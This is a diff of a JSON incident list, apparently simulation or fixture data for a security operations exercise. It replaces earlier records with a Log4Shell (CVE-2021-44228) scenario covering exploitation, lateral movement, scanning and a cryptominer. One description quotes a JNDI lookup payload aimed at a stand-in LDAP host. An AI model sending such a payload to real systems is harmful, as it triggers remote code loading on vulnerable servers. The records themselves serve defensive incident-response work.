@@ -1,46 +1,46 @@
 [
   {
-    "id": "INC-2025-0042",
-    "title": "Possible lateral movement from MERIDIAN-WKS-023",
-    "severity": "HIGH",
+    "id": "INC-2021-0211",
+    "title": "Log4Shell exploitation of SRV-WEB01 (CVE-2021-44228)",
+    "severity": "CRITICAL",
     "status": "open",
-    "created": "2025-05-20T13:30:00Z",
+    "created": "2021-12-11T09:20:00Z",
     "assigned_to": "soc-team",
-    "description": "Following ALT-2025-0002 (encoded PowerShell) and ALT-2025-0004 (PsExec installation), possible lateral movement campaign from MERIDIAN-WKS-023. Investigation in progress.",
-    "related_alerts": ["ALT-2025-0002", "ALT-2025-0004"],
-    "mitre_techniques": ["T1059.001", "T1021.002"]
+    "description": "Internet-facing Java application on SRV-WEB01 exploited via CVE-2021-44228 (Log4Shell). JNDI lookup ${jndi:ldap://192.0.2.66:1389/Exploit} in a request header triggered an outbound LDAP callback and remote class load, followed by a shell and payload download from 192.0.2.66. Containment and patching in progress.",
+    "related_alerts": ["ALT-2021-0001", "ALT-2021-0002", "ALT-2021-0003"],
+    "mitre_techniques": ["T1190", "T1059.004", "T1105"]
   },
   {
-    "id": "INC-2025-0043",
-    "title": "Suspected account compromise — bchen@meridian.fin",
+    "id": "INC-2021-0212",
+    "title": "Lateral movement from SRV-WEB01 to SRV-DB01",
     "severity": "HIGH",
     "status": "open",
-    "created": "2025-05-21T02:20:00Z",
+    "created": "2021-12-11T10:10:00Z",
     "assigned_to": "soc-team",
-    "description": "Impossible travel alert for bchen@meridian.fin. Account sessions revoked pending investigation. User contacted; claims to be in London only.",
-    "related_alerts": ["ALT-2025-0006"],
-    "mitre_techniques": ["T1078", "T1539"]
+    "description": "Following the Log4Shell compromise of SRV-WEB01 (INC-2021-0211), a service-account SSH session was established from SRV-WEB01 (10.0.30.11) to SRV-DB01. Treated as post-exploitation lateral movement. Service-account credentials rotated.",
+    "related_alerts": ["ALT-2021-0004"],
+    "mitre_techniques": ["T1021.004", "T1078"]
   },
   {
-    "id": "INC-2025-0039",
-    "title": "DLP: bulk email to external domain",
-    "severity": "MEDIUM",
+    "id": "INC-2021-0205",
+    "title": "Internet-wide Log4Shell scanning (no successful exploit)",
+    "severity": "LOW",
     "status": "closed",
-    "created": "2025-05-15T09:00:00Z",
+    "created": "2021-12-10T20:00:00Z",
     "assigned_to": "soc-analyst-2",
-    "description": "DLP alert for 47-recipient bulk email from finance team. Confirmed as legitimate mailing list distribution for quarterly report. Closed as false positive.",
-    "related_alerts": [],
-    "mitre_techniques": []
+    "description": "Mass scanning for CVE-2021-44228 observed from 198.51.100.23 against the perimeter. Probes hit WIN-WKS-023 and other hosts with no vulnerable Log4j2 listener. Closed after confirming no JNDI callback originated from internal hosts.",
+    "related_alerts": ["ALT-2021-0006"],
+    "mitre_techniques": ["T1595.002"]
   },
   {
-    "id": "INC-2024-0612",
-    "title": "Credential phishing — finance team (2024-Q2)",
-    "severity": "HIGH",
-    "status": "closed",
-    "created": "2024-06-12T09:19:00Z",
+    "id": "INC-2021-0218",
+    "title": "Coin miner dropped on SRV-WEB01",
+    "severity": "MEDIUM",
+    "status": "open",
+    "created": "2021-12-11T10:40:00Z",
     "assigned_to": "ir-team",
-    "description": "Three finance accounts compromised via credential phishing. Contained in 4 hours. See post-incident report in knowledge base.",
-    "related_alerts": [],
-    "mitre_techniques": ["T1566.002", "T1078"]
+    "description": "An opportunistic cryptominer (kdevtmpfsi) was dropped on SRV-WEB01 via the Log4Shell foothold (INC-2021-0211). Host isolated; forensic image taken before remediation.",
+    "related_alerts": ["ALT-2021-0005"],
+    "mitre_techniques": ["T1496"]
   }
 ]
